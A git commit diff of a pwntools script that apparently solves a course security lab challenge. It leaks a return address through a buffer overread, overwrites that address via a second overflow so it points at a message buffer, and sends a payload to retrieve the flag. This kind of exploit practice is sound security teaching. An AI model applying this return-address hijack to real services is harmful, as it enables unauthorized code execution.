9a04605dd4dbc8b45545eead5694026d09f0f132
Leaf Ying <leaf.ying.work@gmail.com>
2025-05-26 19:38:01 +0800

    Refactor lab6-2 codebase

--- lab6/chal_2.py
+++ lab6/chal_2.py
@@ -1,31 +1,47 @@
 from pwn import asm, remote
 
+OFFSET_BUF1_TO_RETURN_ADDR = 0x38
+OFFSET_BUF2_TO_RETURN_ADDR = OFFSET_BUF1_TO_RETURN_ADDR + 0x30
+OFFSET_RETURN_ADDR_TO_MSG = 0xE5587
+
 
 def solve(r: remote, data: bytes):
-    msg = r.recvuntil(b"What's your name? ").decode()
-    print(msg)
+    r.recvuntil(b"What's your name? ")
 
     # leak the return address
-    r.sendline(b"A" * 55)
-    ret_addr = r.recvlinesb(2)[1]
-    print(f"Original return address: {ret_addr}")
-    # ret_addr = r.recvuntil(b"\nWhat's the room number? ", drop=True)
-    # print(ret_addr)
+    msg = b"A" * (OFFSET_BUF1_TO_RETURN_ADDR - 1)
+    r.sendline(msg)
+    ret_addr = int.from_bytes(r.recvlinesb(2)[1], byteorder="little")
+    print(f"original return address: 0x{ret_addr:x}")
 
-    r.interactive()
+    r.recvuntil(b"What's the room number? ")
 
-    # r.sendline(b"A")
-    # r.sendline(b"A")
+    # calculate the absolute address of msg buffer based on the return address
+    msg_addr = ret_addr + OFFSET_RETURN_ADDR_TO_MSG
+    print(f"msg buffer address: 0x{msg_addr:x}")
 
-    # msg = r.recvuntil(b"Leave your message: ").decode()
-    # print(msg)
+    # modify the return address
+    msg = b"A" * OFFSET_BUF2_TO_RETURN_ADDR
+    r.sendline(msg + msg_addr.to_bytes(8, byteorder="little"))
 
-    # r.sendline(data)
+    r.recvuntil(b"The room number is: ")
 
-    # msg = r.recvuntil(b"}").decode()
-    # print(msg)
+    # check if the new return address is correct
+    new_ret_addr = r.recvline(keepends=False)[OFFSET_BUF2_TO_RETURN_ADDR:]
+    new_ret_addr = int.from_bytes(new_ret_addr, byteorder="little")
+    print(f"new return address: 0x{new_ret_addr:x}")
 
-    # r.close()
+    r.recvuntil(b"What's the customer's name? ")
+    r.sendline()
+
+    r.recvuntil(b"Leave your message: ")
+    r.sendline(data)
+    r.recvline()
+
+    msg = r.recvuntil(b"}").decode()
+    print(msg)
+
+    r.close()
 
 
 if __name__ == "__main__":
